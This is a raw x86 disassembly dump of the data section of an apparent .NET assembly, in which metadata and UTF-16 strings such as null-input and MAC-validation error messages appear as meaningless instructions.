  40bc4d:	2e 00 00             	add    %al,%cs:(%eax)
  40bc50:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40bc55:	70 00                	jo     0x40bc57
  40bc57:	75 00                	jne    0x40bc59
  40bc59:	74 00                	je     0x40bc5b
  40bc5b:	20 00                	and    %al,(%eax)
  40bc5d:	63 00                	arpl   %eax,(%eax)
  40bc5f:	61                   	popa
  40bc60:	00 6e 00             	add    %ch,0x0(%esi)
  40bc63:	20 00                	and    %al,(%eax)
  40bc65:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc66:	00 6f 00             	add    %ch,0x0(%edi)
  40bc69:	74 00                	je     0x40bc6b
  40bc6b:	20 00                	and    %al,(%eax)
  40bc6d:	62 00                	bound  %eax,(%eax)
  40bc6f:	65 00 20             	add    %ah,%gs:(%eax)
  40bc72:	00 6e 00             	add    %ch,0x0(%esi)
  40bc75:	75 00                	jne    0x40bc77
  40bc77:	6c                   	insb   (%dx),%es:(%edi)
  40bc78:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bc7c:	00 00                	add    %al,(%eax)
  40bc7e:	55                   	push   %ebp
  40bc7f:	49                   	dec    %ecx
  40bc80:	00 6e 00             	add    %ch,0x0(%esi)
  40bc83:	76 00                	jbe    0x40bc85
  40bc85:	61                   	popa
  40bc86:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bc8a:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bc8e:	00 6d 00             	add    %ch,0x0(%ebp)
  40bc91:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bc95:	73 00                	jae    0x40bc97
  40bc97:	61                   	popa
  40bc98:	00 67 00             	add    %ah,0x0(%edi)
  40bc9b:	65 00 20             	add    %ah,%gs:(%eax)
  40bc9e:	00 61 00             	add    %ah,0x0(%ecx)
  40bca1:	75 00                	jne    0x40bca3
  40bca3:	74 00                	je     0x40bca5
  40bca5:	68 00 65 00 6e       	push   $0x6e006500
  40bcaa:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bcae:	00 63 00             	add    %ah,0x0(%ebx)
  40bcb1:	61                   	popa
  40bcb2:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bcb6:	00 6f 00             	add    %ch,0x0(%edi)
  40bcb9:	6e                   	outsb  %ds:(%esi),(%dx)
  40bcba:	00 20                	add    %ah,(%eax)
  40bcbc:	00 63 00             	add    %ah,0x0(%ebx)
  40bcbf:	6f                   	outsl  %ds:(%esi),(%dx)
  40bcc0:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bcc4:	00 20                	add    %ah,(%eax)
  40bcc6:	00 28                	add    %ch,(%eax)
  40bcc8:	00 4d 00             	add    %cl,0x0(%ebp)
  40bccb:	41                   	inc    %ecx
  40bccc:	00 43 00             	add    %al,0x0(%ebx)
  40bccf:	29 00                	sub    %eax,(%eax)
  40bcd1:	2e 00 00             	add    %al,%cs:(%eax)
  40bcd4:	05 58 00 32 00       	add    $0x320058,%eax
  40bcd9:	00 0f                	add    %cl,(%edi)
  40bcdb:	7b 00                	jnp    0x40bcdd
  40bcdd:	30 00                	xor    %al,(%eax)
  40bcdf:	3a 00                	cmp    (%eax),%al
  40bce1:	44                   	inc    %esp
  40bce2:	00 33                	add    %dh,(%ebx)
  40bce4:	00 7d 00             	add    %bh,0x0(%ebp)
  40bce7:	20 00                	and    %al,(%eax)
  40bce9:	00 0f                	add    %cl,(%edi)
  40bceb:	7b 00                	jnp    0x40bced
  40bced:	30 00                	xor    %al,(%eax)
  40bcef:	3a 00                	cmp    (%eax),%al
  40bcf1:	58                   	pop    %eax
  40bcf2:	00 32                	add    %dh,(%edx)
  40bcf4:	00 7d 00             	add    %bh,0x0(%ebp)
  40bcf7:	20 00                	and    %al,(%eax)
  40bcf9:	00 2b                	add    %ch,(%ebx)
  40bcfb:	28 00                	sub    %al,(%eax)
  40bcfd:	6e                   	outsb  %ds:(%esi),(%dx)
  40bcfe:	00 65 00             	add    %ah,0x0(%ebp)
  40bd01:	76 00                	jbe    0x40bd03
  40bd03:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bd07:	20 00                	and    %al,(%eax)
  40bd09:	75 00                	jne    0x40bd0b
  40bd0b:	73 00                	jae    0x40bd0d
  40bd0d:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40bd12:	00 20                	add    %ah,(%eax)
  40bd14:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40bd18:	00 70 00             	add    %dh,0x0(%eax)
  40bd1b:	65 00 20             	add    %ah,%gs:(%eax)
  40bd1e:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bd21:	63 00                	arpl   %eax,(%eax)
  40bd23:	31 00                	xor    %eax,(%eax)
  40bd25:	00 45 28             	add    %al,0x28(%ebp)
  40bd28:	00 65 00             	add    %ah,0x0(%ebp)
  40bd2b:	78 00                	js     0x40bd2d
  40bd2d:	74 00                	je     0x40bd2f
  40bd2f:	38 00                	cmp    %al,(%eax)
  40bd31:	2c 00                	sub    $0x0,%al
  40bd33:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd37:	74 00                	je     0x40bd39
  40bd39:	31 00                	xor    %eax,(%eax)
  40bd3b:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40bd3f:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd43:	33 00                	xor    (%eax),%eax
  40bd45:	32 00                	xor    (%eax),%al
  40bd47:	29 00                	sub    %eax,(%eax)
  40bd49:	20 00                	and    %al,(%eax)
  40bd4b:	74 00                	je     0x40bd4d
  40bd4d:	79 00                	jns    0x40bd4f
  40bd4f:	70 00                	jo     0x40bd51
  40bd51:	65 00 20             	add    %ah,%gs:(%eax)
  40bd54:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bd57:	63 00                	arpl   %eax,(%eax)
  40bd59:	37                   	aaa
  40bd5a:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40bd5d:	24 00                	and    $0x0,%al
  40bd5f:	63 00                	arpl   %eax,(%eax)
  40bd61:	38 00                	cmp    %al,(%eax)
  40bd63:	2c 00                	sub    $0x0,%al
  40bd65:	24 00                	and    $0x0,%al
  40bd67:	63 00                	arpl   %eax,(%eax)
  40bd69:	39 00                	cmp    %eax,(%eax)
  40bd6b:	00 14 74             	add    %dl,(%esp,%esi,2)
  40bd6e:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40bd72:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40bd75:	24 f5                	and    $0xf5,%al
  40bd77:	ac                   	lods   %ds:(%esi),%al
  40bd78:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40bd7f:	7a 5c                	jp     0x40bddd
  40bd81:	56                   	push   %esi
  40bd82:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40bd85:	89 03                	mov    %eax,(%ebx)
  40bd87:	00 00                	add    %al,(%eax)
  40bd89:	01 03                	add    %eax,(%ebx)
  40bd8b:	20 00                	and    %al,(%eax)
  40bd8d:	01 02                	add    %eax,(%edx)
  40bd8f:	06                   	push   %es
  40bd90:	0e                   	push   %cs
  40bd91:	03 06                	add    (%esi),%eax
  40bd93:	12 09                	adc    (%ecx),%cl
  40bd95:	03 06                	add    (%esi),%eax
  40bd97:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40bd9b:	00 02                	add    %al,(%edx)
  40bd9d:	03 06                	add    (%esi),%eax
  40bd9f:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40bda5:	03 06                	add    (%esi),%eax
  40bda7:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40bdac:	03 06                	add    (%esi),%eax
  40bdae:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40bdb4:	06                   	push   %es
  40bdb5:	1c 02                	sbb    $0x2,%al
  40bdb7:	06                   	push   %es
  40bdb8:	08 04 00             	or     %al,(%eax,%eax,1)
  40bdbb:	00 12                	add    %dl,(%edx)
  40bdbd:	0d 05 00 01 01       	or     $0x1010005,%eax
  40bdc2:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40bdc8:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40bdce:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40bdd1:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40bdd7:	01 1d 05 03 00 00    	add    %ebx,0x305
  40bddd:	0a 04 00             	or     (%eax,%eax,1),%al
  40bde0:	01 01                	add    %eax,(%ecx)
  40bde2:	0a 04 00             	or     (%eax,%eax,1),%al
  40bde5:	00 12                	add    %dl,(%edx)
  40bde7:	15 05 00 01 01       	adc    $0x1010005,%eax
  40bdec:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40bdf2:	02 03                	add    (%ebx),%al
  40bdf4:	00 00                	add    %al,(%eax)
  40bdf6:	1c 03                	sbb    $0x3,%al
  40bdf8:	00 00                	add    %al,(%eax)
  40bdfa:	08 04 00             	or     %al,(%eax,%eax,1)
  40bdfd:	01 01                	add    %eax,(%ecx)
  40bdff:	08 04 00             	or     %al,(%eax,%eax,1)
  40be02:	01 02                	add    %eax,(%edx)
  40be04:	0e                   	push   %cs
  40be05:	0a 00                	or     (%eax),%al
  40be07:	04 02                	add    $0x2,%al
  40be09:	1c 12                	sbb    $0x12,%al
  40be0b:	19 12                	sbb    %edx,(%edx)
  40be0d:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40be12:	01 01                	add    %eax,(%ecx)
  40be14:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40be1a:	1c 04                	sbb    $0x4,%al
  40be1c:	08 00                	or     %al,(%eax)
  40be1e:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40be24:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40be27:	00 1d 05 03 08 00    	add    %bl,0x80305
  40be2d:	0a 04 08             	or     (%eax,%ecx,1),%al
  40be30:	00 12                	add    %dl,(%edx)
  40be32:	15 03 08 00 02       	adc    $0x2000803,%eax
  40be37:	03 08                	add    (%eax),%ecx
  40be39:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40be3c:	08 00                	or     %al,(%eax)
  40be3e:	08 03                	or     %al,(%ebx)
  40be40:	00 00                	add    %al,(%eax)
  40be42:	0e                   	push   %cs
  40be43:	04 00                	add    $0x0,%al
  40be45:	01 0e                	add    %ecx,(%esi)
  40be47:	0e                   	push   %cs
  40be48:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40be4e:	d5 0a                	aad    $0xa
  40be50:	3a 06                	cmp    (%esi),%al
  40be52:	00 01                	add    %al,(%ecx)
  40be54:	12 29                	adc    (%ecx),%ch
  40be56:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40be5c:	03 00                	add    (%eax),%eax
  40be5e:	00 18                	add    %bl,(%eax)
  40be60:	07                   	pop    %es
  40be61:	00 03                	add    %al,(%ebx)
  40be63:	08 18                	or     %bl,(%eax)
  40be65:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40be6b:	18 0e                	sbb    %cl,(%esi)
  40be6d:	06                   	push   %es
  40be6e:	00 02                	add    %al,(%edx)
  40be70:	02 18                	add    (%eax),%bl
  40be72:	10 02                	adc    %al,(%edx)
  40be74:	06                   	push   %es
  40be75:	00 01                	add    %al,(%ecx)
  40be77:	11 30                	adc    %esi,(%eax)
  40be79:	11 30                	adc    %esi,(%eax)
  40be7b:	06                   	push   %es
  40be7c:	00 03                	add    %al,(%ebx)
  40be7e:	01 09                	add    %ecx,(%ecx)
  40be80:	09 09                	or     %ecx,(%ecx)
  40be82:	02 06                	add    (%esi),%al
  40be84:	09 03                	or     %eax,(%ebx)
  40be86:	06                   	push   %es
  40be87:	11 30                	adc    %esi,(%eax)
  40be89:	04 00                	add    $0x0,%al
  40be8b:	00 00                	add    %al,(%eax)
  40be8d:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40be91:	00 00                	add    %al,(%eax)
  40be93:	04 01                	add    $0x1,%al
  40be95:	00 00                	add    %al,(%eax)
  40be97:	00 06                	add    %al,(%esi)
  40be99:	00 02                	add    %al,(%edx)
  40be9b:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40be9e:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40bea3:	0e                   	push   %cs
  40bea4:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bea9:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40beae:	15 12 41 01 12       	adc    $0x12014112,%eax
  40beb3:	60                   	pusha
  40beb4:	05 00 01 01 12       	add    $0x12010100,%eax
  40beb9:	60                   	pusha
  40beba:	04 00                	add    $0x0,%al
  40bebc:	01 01                	add    %eax,(%ecx)
  40bebe:	0e                   	push   %cs
  40bebf:	18 06                	sbb    %al,(%esi)
  40bec1:	15 12 45 01 15       	adc    $0x15014512,%eax
  40bec6:	12 49 0a             	adc    0xa(%ecx),%cl
  40bec9:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40becc:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40bed2:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40bed7:	0e                   	push   %cs
  40bed8:	04 20                	add    $0x20,%al
  40beda:	00 00                	add    %al,(%eax)
  40bedc:	00 04 40             	add    %al,(%eax,%eax,2)
  40bedf:	00 00                	add    %al,(%eax)
  40bee1:	00 04 10             	add    %al,(%eax,%edx,1)
  40bee4:	00 00                	add    %al,(%eax)
  40bee6:	00 04 20             	add    %al,(%eax,%eiz,1)
  40bee9:	01 01                	add    %eax,(%ecx)
  40beeb:	0e                   	push   %cs
  40beec:	04 20                	add    $0x20,%al
  40beee:	01 0e                	add    %ecx,(%esi)
  40bef0:	0e                   	push   %cs
  40bef1:	06                   	push   %es
  40bef2:	20 01                	and    %al,(%ecx)
  40bef4:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40bef9:	20 02                	and    %al,(%edx)
  40befb:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40bf01:	00 01                	add    %al,(%ecx)
  40bf03:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40bf08:	06                   	push   %es
  40bf09:	11 50 03             	adc    %edx,0x3(%eax)
  40bf0c:	06                   	push   %es
  40bf0d:	12 55 05             	adc    0x5(%ebp),%dl
  40bf10:	00 01                	add    %al,(%ecx)
  40bf12:	0e                   	push   %cs
  40bf13:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bf18:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40bf1d:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40bf23:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40bf29:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40bf2f:	01 01                	add    %eax,(%ecx)
  40bf31:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf36:	60                   	pusha
  40bf37:	03 20                	add    (%eax),%esp
  40bf39:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40bf3c:	20 00                	and    %al,(%eax)
  40bf3e:	02 03                	add    (%ebx),%al
  40bf40:	28 00                	sub    %al,(%eax)
  40bf42:	1c 03                	sbb    $0x3,%al
  40bf44:	06                   	push   %es
  40bf45:	12 60 0b             	adc    0xb(%eax),%ah
  40bf48:	20 02                	and    %al,(%edx)
  40bf4a:	01 12                	add    %edx,(%edx)
  40bf4c:	60                   	pusha
  40bf4d:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf52:	60                   	pusha
  40bf53:	04 20                	add    $0x20,%al
  40bf55:	00 12                	add    %dl,(%edx)
  40bf57:	60                   	pusha
  40bf58:	05 20 01 12 60       	add    $0x60120120,%eax
  40bf5d:	0e                   	push   %cs
  40bf5e:	05 20 01 12 60       	add    $0x60120120,%eax
  40bf63:	0a 05 20 01 12 60    	or     0x60120120,%al
  40bf69:	0d 05 20 01 12       	or     $0x12012005,%eax
  40bf6e:	60                   	pusha
  40bf6f:	08 03                	or     %al,(%ebx)
  40bf71:	20 00                	and    %al,(%eax)
  40bf73:	08 05 28 01 12 60    	or     %al,0x60120128
  40bf79:	08 03                	or     %al,(%ebx)
  40bf7b:	28 00                	sub    %al,(%eax)
  40bf7d:	08 03                	or     %al,(%ebx)
  40bf7f:	06                   	push   %es
  40bf80:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40bf84:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40bf88:	01 08                	add    %ecx,(%eax)
  40bf8a:	0e                   	push   %cs
  40bf8b:	05 20 01 01 12       	add    $0x12010120,%eax
  40bf90:	61                   	popa
  40bf91:	04 20                	add    $0x20,%al
  40bf93:	01 01                	add    %eax,(%ecx)
  40bf95:	0a 04 20             	or     (%eax,%eiz,1),%al
  40bf98:	01 01                	add    %eax,(%ecx)
  40bf9a:	0b 03                	or     (%ebx),%eax
  40bf9c:	20 00                	and    %al,(%eax)
  40bf9e:	0b 03                	or     (%ebx),%eax
  40bfa0:	20 00                	and    %al,(%eax)
  40bfa2:	0a 03                	or     (%ebx),%al
  40bfa4:	20 00                	and    %al,(%eax)
  40bfa6:	0d 05 20 01 01       	or     $0x1012005,%eax
  40bfab:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40bfb0:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40bfb5:	01 0e                	add    %ecx,(%esi)
  40bfb7:	0e                   	push   %cs
  40bfb8:	05 20 02 01 0e       	add    $0xe010220,%eax
  40bfbd:	08 04 20             	or     %al,(%eax,%eiz,1)
  40bfc0:	01 02                	add    %eax,(%edx)
  40bfc2:	0e                   	push   %cs
  40bfc3:	03 20                	add    (%eax),%esp
  40bfc5:	00 0e                	add    %cl,(%esi)
  40bfc7:	04 20                	add    $0x20,%al
  40bfc9:	01 01                	add    %eax,(%ecx)
  40bfcb:	02 04 20             	add    (%eax,%eiz,1),%al
  40bfce:	01 01                	add    %eax,(%ecx)
  40bfd0:	0c 04                	or     $0x4,%al
  40bfd2:	20 01                	and    %al,(%ecx)
  40bfd4:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40bfda:	5c                   	pop    %esp
  40bfdb:	04 20                	add    $0x20,%al
  40bfdd:	00 11                	add    %dl,(%ecx)
  40bfdf:	64 04 20             	fs add $0x20,%al
  40bfe2:	00 12                	add    %dl,(%edx)
  40bfe4:	59                   	pop    %ecx
  40bfe5:	03 28                	add    (%eax),%ebp
  40bfe7:	00 0e                	add    %cl,(%esi)
  40bfe9:	03 28                	add    (%eax),%ebp
  40bfeb:	00 0a                	add    %cl,(%edx)
  40bfed:	03 28                	add    (%eax),%ebp
  40bfef:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40bff5:	5c                   	pop    %esp
  40bff6:	04 28                	add    $0x28,%al
  40bff8:	00 11                	add    %dl,(%ecx)
  40bffa:	64 04 00             	fs add $0x0,%al
  40bffd:	00 00                	add    %al,(%eax)
  40bfff:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c002:	00 00                	add    %al,(%eax)
  40c004:	00 04 04             	add    %al,(%esp,%eax,1)
  40c007:	00 00                	add    %al,(%eax)
  40c009:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c010:	06                   	push   %es
  40c011:	00 00                	add    %al,(%eax)
  40c013:	00 04 07             	add    %al,(%edi,%eax,1)
  40c016:	00 00                	add    %al,(%eax)
  40c018:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c01b:	00 00                	add    %al,(%eax)
  40c01d:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c020:	00 00                	add    %al,(%eax)
  40c022:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c025:	00 00                	add    %al,(%eax)
  40c027:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c02a:	00 00                	add    %al,(%eax)
  40c02c:	00 06                	add    %al,(%esi)
  40c02e:	00 02                	add    %al,(%edx)
  40c030:	0e                   	push   %cs
  40c031:	12 61 08             	adc    0x8(%ecx),%ah
  40c034:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40c039:	61                   	popa
  40c03a:	06                   	push   %es
  40c03b:	00 02                	add    %al,(%edx)
  40c03d:	0e                   	push   %cs
  40c03e:	05 12 61 05 00       	add    $0x56112,%eax
  40c043:	01 01                	add    %eax,(%ecx)
  40c045:	12 61 06             	adc    0x6(%ecx),%ah
  40c048:	00 02                	add    %al,(%edx)
  40c04a:	01 12                	add    %edx,(%edx)
  40c04c:	61                   	popa
  40c04d:	0e                   	push   %cs
  40c04e:	07                   	pop    %es
  40c04f:	00 02                	add    %al,(%edx)
  40c051:	01 12                	add    %edx,(%edx)
  40c053:	61                   	popa
  40c054:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40c059:	01 12                	add    %edx,(%edx)
  40c05b:	61                   	popa
  40c05c:	0d 06 00 02 01       	or     $0x1020006,%eax
  40c061:	12 61 0c             	adc    0xc(%ecx),%ah
  40c064:	06                   	push   %es
  40c065:	00 02                	add    %al,(%edx)
  40c067:	01 12                	add    %edx,(%edx)
  40c069:	61                   	popa
  40c06a:	02 06                	add    (%esi),%al
  40c06c:	00 02                	add    %al,(%edx)
  40c06e:	01 12                	add    %edx,(%edx)
  40c070:	61                   	popa
  40c071:	0b 06                	or     (%esi),%eax
  40c073:	00 02                	add    %al,(%edx)
  40c075:	01 12                	add    %edx,(%edx)
  40c077:	61                   	popa
  40c078:	0a 03                	or     (%ebx),%al
  40c07a:	06                   	push   %es
  40c07b:	11 78 04             	adc    %edi,0x4(%eax)
  40c07e:	20 01                	and    %al,(%ecx)
  40c080:	01 08                	add    %ecx,(%eax)
  40c082:	08 01                	or     %al,(%ecx)
  40c084:	00 08                	add    %cl,(%eax)
  40c086:	00 00                	add    %al,(%eax)
  40c088:	00 00                	add    %al,(%eax)
  40c08a:	00 1e                	add    %bl,(%esi)
  40c08c:	01 00                	add    %eax,(%eax)
  40c08e:	01 00                	add    %eax,(%eax)
  40c090:	54                   	push   %esp
  40c091:	02 16                	add    (%esi),%dl
  40c093:	57                   	push   %edi
  40c094:	72 61                	jb     0x40c0f7
  40c096:	70 4e                	jo     0x40c0e6
  40c098:	6f                   	outsl  %ds:(%esi),(%dx)
  40c099:	6e                   	outsb  %ds:(%esi),(%dx)
  40c09a:	45                   	inc    %ebp
  40c09b:	78 63                	js     0x40c100
  40c09d:	65 70 74             	gs jo  0x40c114
  40c0a0:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c0a7:	77 73                	ja     0x40c11c
  40c0a9:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c0af:	71 08                	jno    0x40c0b9
  40c0b1:	01 00                	add    %eax,(%eax)
  40c0b3:	02 00                	add    (%eax),%al
  40c0b5:	00 00                	add    %al,(%eax)
  40c0b7:	00 00                	add    %al,(%eax)
  40c0b9:	05 01 00 00 00       	add    $0x1,%eax
  40c0be:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c0c1:	00 07                	add    %al,(%edi)
  40c0c3:	31 2e                	xor    %ebp,(%esi)
  40c0c5:	30 2e                	xor    %ch,(%esi)
  40c0c7:	30 2e                	xor    %ch,(%esi)
  40c0c9:	30 00                	xor    %al,(%eax)
  40c0cb:	00 65 01             	add    %ah,0x1(%ebp)
  40c0ce:	00 29                	add    %ch,(%ecx)
  40c0d0:	2e 4e                	cs dec %esi
  40c0d2:	45                   	inc    %ebp
  40c0d3:	54                   	push   %esp
  40c0d4:	46                   	inc    %esi
  40c0d5:	72 61                	jb     0x40c138
  40c0d7:	6d                   	insl   (%dx),%es:(%edi)
  40c0d8:	65 77 6f             	gs ja  0x40c14a
  40c0db:	72 6b                	jb     0x40c148
  40c0dd:	2c 56                	sub    $0x56,%al
  40c0df:	65 72 73             	gs jb  0x40c155
  40c0e2:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c0e9:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40c0ec:	72 6f                	jb     0x40c15d
  40c0ee:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40c0f5:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40c0fc:	0e                   	push   %cs
  40c0fd:	14 46                	adc    $0x46,%al
  40c0ff:	72 61                	jb     0x40c162
  40c101:	6d                   	insl   (%dx),%es:(%edi)
  40c102:	65 77 6f             	gs ja  0x40c174
  40c105:	72 6b                	jb     0x40c172
  40c107:	44                   	inc    %esp
  40c108:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c10f:	61                   	popa
  40c110:	6d                   	insl   (%dx),%es:(%edi)
  40c111:	65 1f                	gs pop %ds
  40c113:	2e 4e                	cs dec %esi
  40c115:	45                   	inc    %ebp
  40c116:	54                   	push   %esp
  40c117:	20 46 72             	and    %al,0x72(%esi)
  40c11a:	61                   	popa
  40c11b:	6d                   	insl   (%dx),%es:(%edi)
  40c11c:	65 77 6f             	gs ja  0x40c18e
  40c11f:	72 6b                	jb     0x40c18c
  40c121:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40c124:	43                   	inc    %ebx
  40c125:	6c                   	insb   (%dx),%es:(%edi)
  40c126:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40c12d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c12e:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40c135:	04 49                	add    $0x49,%al
  40c137:	74 65                	je     0x40c19e
  40c139:	6d                   	insl   (%dx),%es:(%edi)
  40c13a:	00 00                	add    %al,(%eax)
  40c13c:	03 07                	add    (%edi),%eax
  40c13e:	01 08                	add    %ecx,(%eax)
  40c140:	04 00                	add    $0x0,%al
  40c142:	01 08                	add    %ecx,(%eax)
  40c144:	0e                   	push   %cs
  40c145:	03 07                	add    (%edi),%eax
  40c147:	01 02                	add    %eax,(%edx)
  40c149:	05 00 00 12 80       	add    $0x80120000,%eax
  40c14e:	b1 05                	mov    $0x5,%cl
  40c150:	20 01                	and    %al,(%ecx)
  40c152:	0e                   	push   %cs
  40c153:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c158:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40c15e:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40c164:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c169:	03 02                	add    (%edx),%eax
  40c16b:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c170:	14 07                	adc    $0x7,%al
  40c172:	08 0e                	or     %cl,(%esi)
  40c174:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40c17a:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40c180:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40c186:	20 03                	and    %al,(%ebx)
  40c188:	01 11                	add    %edx,(%ecx)
  40c18a:	80 d5 11             	adc    $0x11,%ch
  40c18d:	80 d9 11             	sbb    $0x11,%cl
  40c190:	80 dd 05             	sbb    $0x5,%ch
  40c193:	00 02                	add    %al,(%edx)
  40c195:	02 0e                	add    (%esi),%cl
  40c197:	0e                   	push   %cs
  40c198:	06                   	push   %es
  40c199:	20 01                	and    %al,(%ecx)
  40c19b:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c1a0:	20 01                	and    %al,(%ecx)
  40c1a2:	08 08                	or     %cl,(%eax)
  40c1a4:	07                   	pop    %es
  40c1a5:	00 01                	add    %al,(%ecx)
  40c1a7:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40c1ac:	07                   	pop    %es
  40c1ad:	20 02                	and    %al,(%edx)
  40c1af:	01 12                	add    %edx,(%edx)
  40c1b1:	80 c9 08             	or     $0x8,%cl
  40c1b4:	06                   	push   %es
  40c1b5:	20 01                	and    %al,(%ecx)
  40c1b7:	01 12                	add    %edx,(%edx)
  40c1b9:	80 f1 09             	xor    $0x9,%cl
  40c1bc:	20 02                	and    %al,(%edx)
  40c1be:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c1c3:	80 f5 05             	xor    $0x5,%ch
  40c1c6:	20 02                	and    %al,(%edx)
  40c1c8:	08 08                	or     %cl,(%eax)
  40c1ca:	08 06                	or     %al,(%esi)
  40c1cc:	20 02                	and    %al,(%edx)
  40c1ce:	01 12                	add    %edx,(%edx)
  40c1d0:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c1d5:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c1d8:	09 20                	or     %esp,(%eax)
  40c1da:	03 01                	add    (%ecx),%eax
  40c1dc:	12 61 02             	adc    0x2(%ecx),%ah
  40c1df:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40c1e5:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40c1eb:	01 0e                	add    %ecx,(%esi)
  40c1ed:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40c1f3:	02 09                	add    (%ecx),%cl
  40c1f5:	20 04 01             	and    %al,(%ecx,%eax,1)
  40c1f8:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c1fe:	0c 20                	or     $0x20,%al
  40c200:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c205:	08 08                	or     %cl,(%eax)
  40c207:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c20d:	01 11                	add    %edx,(%ecx)
  40c20f:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
